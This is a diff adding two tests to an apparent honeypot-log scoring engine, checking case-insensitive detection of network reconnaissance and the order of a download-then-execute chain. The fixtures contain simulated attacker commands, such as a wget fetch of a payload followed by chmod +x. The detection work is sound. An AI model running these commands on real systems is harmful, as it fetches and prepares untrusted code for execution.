@@ -143,3 +143,42 @@ test('Download detection is case-insensitive', () => {
 
     assert.strictEqual(result.summary.downloadCount, 1);
 });
+
+test('Network discovery scoring is case-insensitive', () => {
+    const events = [
+        { eventid: 'cowrie.login.success', username: 'root' },
+        { eventid: 'cowrie.command.input', input: 'NETSTAT -an' }
+    ];
+
+    const result = engine.evaluateSessionEvents(events);
+
+    assert.strictEqual(result.summary.reconCount, 1);
+    assert.ok(
+        result.explanations.some(
+            explanation => explanation.reason.includes('Network topology discovery')
+        ),
+        'Expected network topology discovery evidence'
+    );
+});
+
+test('Download-then-execute chain requires download before execution', () => {
+    const downloadedFirst = engine.evaluateSessionEvents([
+        { eventid: 'cowrie.login.success', username: 'root' },
+        { eventid: 'cowrie.command.input', input: 'wget http://example.com/payload' },
+        { eventid: 'cowrie.command.input', input: 'chmod +x payload' }
+    ]);
+
+    const executedFirst = engine.evaluateSessionEvents([
+        { eventid: 'cowrie.login.success', username: 'root' },
+        { eventid: 'cowrie.command.input', input: 'chmod +x payload' },
+        { eventid: 'cowrie.command.input', input: 'wget http://example.com/payload' }
+    ]);
+
+    assert.ok(downloadedFirst.explanations.some(e =>
+        e.reason.includes('Download → Execute sequence')
+    ));
+
+    assert.ok(!executedFirst.explanations.some(e =>
+        e.reason.includes('Download → Execute sequence')
+    ));
+});
